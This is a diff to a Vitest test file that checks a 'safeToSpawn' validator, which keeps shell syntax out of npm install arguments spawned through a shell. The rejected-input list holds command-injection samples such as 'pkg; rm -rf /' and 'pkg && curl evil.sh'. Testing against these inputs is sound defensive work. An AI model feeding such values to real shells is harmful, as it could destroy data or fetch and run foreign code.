@@ -1,6 +1,12 @@
 import { describe, expect, it, vi } from 'vitest'
 
-import { classifyInstallFailure, createRuntimeInstaller, installedButNotFound } from './runtime-installer.js'
+import { installCommand } from '../shared/runtime-install.js'
+import {
+  classifyInstallFailure,
+  createRuntimeInstaller,
+  installedButNotFound,
+  safeToSpawn
+} from './runtime-installer.js'
 
 /**
  * What a person sees when the install button does not work.
@@ -205,5 +211,63 @@ describe('a permission failure offers the remedy, not a re-run of itself', () =>
       platform: 'linux'
     })
     expect(offline.command).toBeUndefined()
+  })
+})
+
+/**
+ * The install spawns through a shell -- `shell: true`, because Windows will
+ * not start `npm.cmd` any other way. That is not going to change, so what is
+ * checked here is the other half: that nothing shaped like shell syntax can
+ * reach it.
+ *
+ * Nothing today can fail these. Every install argument comes from a constant
+ * table. The tests exist so that stays true after the table stops being
+ * constant -- the failure they are built to catch is a future package name
+ * read from a config file or typed by a person.
+ */
+describe('what may be handed to the install shell', () => {
+  it('accepts the shapes a real npm install needs', () => {
+    for (const token of [
+      'npm',
+      'install',
+      '-g',
+      'opencode-ai',
+      '@anthropic-ai/claude-code',
+      '@openai/codex',
+      'some.pkg_v2',
+      'npm:alias@1.2.3'
+    ]) {
+      expect(safeToSpawn(token)).toBe(true)
+    }
+  })
+
+  it('refuses every character a shell would read as syntax', () => {
+    for (const token of [
+      'pkg; rm -rf /',
+      'pkg && curl evil.sh',
+      'pkg | tee out',
+      'pkg $(whoami)',
+      'pkg `whoami`',
+      'pkg > file',
+      'pkg\nnext-line',
+      'pkg with space',
+      "pkg'quoted'",
+      'pkg"quoted"',
+      '' // an empty token is not a package, and `npm install ""` is not a plan
+    ]) {
+      expect(safeToSpawn(token)).toBe(false)
+    }
+  })
+
+  it('passes every install line the app can actually build today', () => {
+    // If a new runtime ever needs a package name this rejects, it fails here
+    // -- at a test -- rather than at a shell on someone's machine.
+    for (const runtime of ['opencode', 'claude', 'codex', 'copilot']) {
+      const line = installCommand(runtime)
+      expect(line, runtime).toBeDefined()
+      for (const token of (line as string).split(' ')) {
+        expect(safeToSpawn(token), `${runtime}: ${token}`).toBe(true)
+      }
+    }
   })
 })
